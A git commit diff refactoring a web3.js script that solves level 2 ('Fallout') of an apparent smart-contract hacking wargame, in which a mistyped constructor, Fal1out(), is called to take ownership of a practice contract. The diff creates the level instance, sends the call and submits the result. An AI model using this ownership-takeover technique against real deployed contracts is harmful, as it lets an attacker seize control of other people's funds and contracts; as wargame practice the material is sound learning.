1271db732a8508a2589bbf093ba2f96dd6530c8c
decentralMind <decentralmind@gmail.com>
2020-08-14 17:14:32 +0545

    Web3 implementation hack for level 2

--- 2_falloutHack/fh.js
+++ 2_falloutHack/fh.js
@@ -1,74 +1,46 @@
-const { web3 } = require('../utils/getWeb3.js');
-const { encodeMethodIdWithParameters, getSignedData } = require('../utils/helpers.js');
+const { web3 } = require('../utils/getWeb3');
+const { mainAddress, levelAddresses, deployId, submitId } = require('../utils/contractInfo');
+const { getAccounts, checkLength, sendTransaction, valueFromLogs } = require('../utils/helpers');
 
-// const mainContractAddress = "0xf912de5f8d0dac8ca70c9f4a0d460950e9537850";
-const mainContractAddress = "0xC24b53D5964a80cbBDa8AED9d48d689DDcf1Cf29"
-const level2Address = "0xacdb8f800d8fe8c743f15df8d41f9a91efb54ed1";
+var globalValue = {};
 
-const deploySignedData = async function () {
-    const deployData = await getSignedData("storeNum()", mainContractAddress);
-    
-    const resultData = await web3.eth.sendSignedTransaction(deployData.raw)
-                        .on('transactionHash', function (hash) {
-                            console.log(hash);
-                        }).on('error', function(error){
-                            console.log(error);
-                        });
+const createInstance = async () => {
+    console.log('Creating instance...');
+    const account = await getAccounts(0);
+    globalValue.account = account;
+    const levelAddress = levelAddresses[2];
+    console.log("deploying....");
+    const payload = deployId + '0'.repeat(24) + levelAddress.slice(2);
+    checkLength(payload, 74);
+    return sendTransaction(payload, mainAddress, account);
+};
 
-    return resultData;
-        // .on('transactionHash', function (hash) {
-        //     console.log(hash);
-        // }).on('receipt', function (receipt) {
-        //     return receipt.logs[0]['data'];
-        // }).on('error', function (error) {
-        //     console.log(error);
-        // });
-}
+const initHack = async () => {
+  console.log('Hacking...');
+  console.log('Calling Fal1out method...');
+  const payload = web3.eth.abi.encodeFunctionSignature("Fal1out()");
+  return sendTransaction(payload, globalValue.instanceAddress, globalValue.account);
+};
 
-deploySignedData().then(data => {
-    console.log('inside data');
-    console.log(data)
+const submitInstance = async (instanceAddress) => {
+  console.log('Submitting instance...');
+  const payload = submitId + '0'.repeat(24) + instanceAddress.slice(2);
+  checkLength(payload, 74);
+  const account = await getAccounts(0);
+  return sendTransaction(payload, mainAddress, globalValue.account);
+};
+
+createInstance()
+  .then((receipt) => {
+    const rawAddress = valueFromLogs(receipt, 'data');
+    const instanceAddress = '0x' + rawAddress.slice(26);
+    globalValue.instanceAddress = instanceAddress;
+    return initHack();
+  })
+  .then(() => {
+  return submitInstance(globalValue.instanceAddress);
 })
-
-// const deploySignedData = async function () {
-//     const deployData = await getSignedData("createLevelInstance(address)", mainContractAddress, ['address'], [level2Address]);
-//     web3.eth.sendSignedTransaction(deployData.raw)
-//         .on('transactionHash', function (hash) {
-//             console.log(hash);
-//         }).on('receipt', function (receipt) {
-//             initHack(receipt.logs[0]['data']);
-//         }).on('error', function (error) {
-//             console.log(error);
-//         });
-// }
-
-// const initHack = async function (instanceAddress) {
-//     const addressFormat = '0x' + instanceAddress.slice(26);
-//     const hackData = await getSignedData("Fal1out()", addressFormat);
-//     web3.eth.sendSignedTransaction(hackData.raw)
-//         .on('transactionHash', function (hash) {
-//             console.log(hash);
-//         })
-//         .on('receipt', function (receipt) {
-//             console.log('submitting instance');
-//             console.log('addressFormat', addressFormat);
-//             submitInstance(addressFormat);
-//         }).on('error', function (error) {
-//             console.log(error)
-//         });
-// }
-
-// const submitInstance = async function (instanceAddress) {
-//     // submitLevelInstance(address _instance)
-//     const instanceData = await getSignedData("submitLevelInstance(address)", mainContractAddress, ['address'], [instanceAddress]);
-//     web3.eth.sendSignedTransaction(instanceData.raw)
-//         .on('transactionHash', function (hash) {
-//             console.log(hash);
-//         })
-//         .on('receipt', function (receipt) {
-//             console.log(receipt);
-//         })
-//         .on('error', function (error) {
-//             console.log(error);
-//         });
-// }
+.then((data) => {
+  console.log(data);
+})
+.catch(console.log);
--- utils/contractInfo.js
+++ utils/contractInfo.js
@@ -5,8 +5,9 @@ const mainAddress = "0xf912de5f8d0dac8ca70c9f4a0d460950e9537850";
 */
 const levelAddresses = {
     0:"0xc8bae5314c82d94858fe916067fbfcfe9f32097b",
-    1:"0xd95b091f19946d6ef0c88f8cd360c0d6e408876e"
-}
+    1:"0xd95b091f19946d6ef0c88f8cd360c0d6e408876e",
+    2:"0xAcdB8f800D8fE8c743f15Df8D41f9A91EFb54ed1"
+};
 
 const deployId = "0xdfc86b17";
 const submitId = "0xc882d7c2";
